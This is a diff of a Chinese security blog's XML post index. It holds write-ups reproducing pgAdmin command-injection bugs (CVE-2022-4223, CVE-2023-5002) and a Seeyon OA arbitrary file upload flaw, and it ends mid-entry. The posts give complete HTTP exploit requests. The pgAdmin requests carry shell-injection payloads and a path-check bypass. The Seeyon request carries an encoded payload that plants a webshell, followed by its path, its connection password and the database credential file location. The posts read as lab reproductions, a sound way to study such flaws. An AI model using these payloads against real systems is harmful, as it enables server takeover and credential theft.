+    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
+<span id="more"></span>
+
+<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+</blockquote>
+<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
+<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
+<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
+<p>在本地搭建环境，访问5050端口是登录界面</p>
+<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
+<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
+
+<p>成功命令执行，返回包如下</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
+<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
+<ul>
+<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
+<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
+</ul>
+<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
+<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
+<ul>
+<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
+<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
+</ul>
+<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
+<p>Windows下返回结果为True</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
+<p>而Linux下返回结果为False</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
+<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
+<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
+<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
+<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
+<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
+<p>成功命令执行</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
     <title>fastjson入门学习</title>
     <url>/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html</url>
     <content><![CDATA[<p>记录对java安全的初次探索</p>
@@ -2933,63 +2992,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pgAdmin命令执行漏洞</title>
-    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
-<span id="more"></span>
-
-<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
-</blockquote>
-<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
-<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
-<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
-<p>在本地搭建环境，访问5050端口是登录界面</p>
-<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
-<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
-
-<p>成功命令执行，返回包如下</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
-<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
-<ul>
-<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
-<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
-</ul>
-<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
-<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
-<ul>
-<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
-<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
-</ul>
-<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
-<p>Windows下返回结果为True</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
-<p>而Linux下返回结果为False</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
-<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
-<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
-<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
-<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
-<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
-<p>成功命令执行</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-  </entry>
-  <entry>
     <title>信息搜集</title>
     <url>/article/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.html</url>
     <content><![CDATA[<p>渗透测试的信息搜集</p>
@@ -3180,47 +3182,6 @@
       </categories>
   </entry>
   <entry>
-    <title>记录kali如何挂梯子</title>
-    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
-    <content><![CDATA[<p>记录下kali如何挂梯子</p>
-<span id="more"></span>
-
-
-
-<p><strong>前言</strong></p>
-<blockquote>
-<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
-</blockquote>
-<p><strong>步骤</strong></p>
-<p>我们先创建clash目录</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>
-
-<p>然后我们下载压缩包文件，选择第一个</p>
-<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
-<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
-<p>成功打开后，我们可以汉化一下</p>
-<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
-<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
-<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
-<p>最后就是设置浏览器代理</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
-<p>设置好后，就能成功使用魔法访问外网</p>
-<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
-]]></content>
-      <categories>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>红明谷杯2024</title>
     <url>/article/%E7%BA%A2%E6%98%8E%E8%B0%B72024.html</url>
     <content><![CDATA[<p>pcntl_exec绕过disable_function限制、Rust语言</p>
@@ -3301,6 +3262,94 @@
       </categories>
       <tags>
         <tag>比赛</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>致远OA-ajax.do任意文件上传漏洞</title>
+    <url>/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>利用此漏洞来连接冰蝎，可用来命令执行或者数据库连接</p>
+<span id="more"></span>
+
+<h1 id="致远OA-ajax-do任意文件上传漏洞"><a href="#致远OA-ajax-do任意文件上传漏洞" class="headerlink" title="致远OA-ajax.do任意文件上传漏洞"></a>致远OA-ajax.do任意文件上传漏洞</h1><h2 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h2><blockquote>
+<p>致远OA旧版本中某些接口存在未授权访问，以及部分函数过滤不足，攻击者通过构造恶意请求，可在无需登录的情况下上传恶意脚本，从而控制服务器</p>
+</blockquote>
+<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">致远OA V8.0</span><br><span class="line">致远OA V7.1、V7.1SP1</span><br><span class="line">致远OA V7.0、V7.0SP1、V7.0SP2、V7.0SP3</span><br><span class="line">致远OA V6.0、V6.1SP1、V6.1SP2</span><br><span class="line">致远OA V5.x</span><br><span class="line">致远OA G6</span><br></pre></td></tr></table></figure>
+
+<h2 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h2><p>首先验证漏洞是否存在，访问如下url</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/thirdpartyController.do.css/..;/ajax.do</span><br></pre></td></tr></table></figure>
+
+<p>如果出现异常页面，则漏洞可能存在</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214529204.png"></p>
+<p>POC如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>
+
+<p>如果漏洞利用成功，回显如下界面</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214707896.png"></p>
+<p>利用失败的话回显如下，或者页面空白，警告等</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412214945750.png"></p>
+<p><strong>利用成功后用冰蝎连接</strong> <a href="https://github.com/rebeyond/Behinder/releases">工具链接</a></p>
+<p>webshell路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/seeyon/SeeyonUpdate1.jspx</span><br></pre></td></tr></table></figure>
+
+<p>连接密码：rebeyond</p>
+<p><img src="/article/%E8%87%B4%E8%BF%9COA-ajax-do%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/image-20240412215119512.png"></p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>连接上马后即可命令执行，同样我们可以进行数据库连接从而实现敏感信息泄露</p>
+<p>当然前提是知道连接数据库的密码 <a href="https://www.cmdhack.com/archives/212.html">参考文章</a></p>
+<p>致远OA数据库配置文件路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/Seeyon/A8/base/conf/datasourceCtp.properties</span><br></pre></td></tr></table></figure>
+
+<p>访问可以找到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.backup.path=</span><br><span class="line">db.hibernateDialect=org.hibernate.dialect.SQLServerDialect</span><br><span class="line">ctpDataSource.username=sa</span><br><span class="line">workflow.dialect=SQLServer</span><br><span class="line">ctpDataSource.driverClassName=com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class="line">ctpDataSource.password=/1.0/UWJ0dHgxc2U=</span><br><span class="line">ctpDataSource.url=jdbc:sqlserver://127.0.0.1:1433;DatabaseName=seeyou2;maxStatements=0;SelectMethod=cursor</span><br><span class="line">mysql.path=</span><br><span 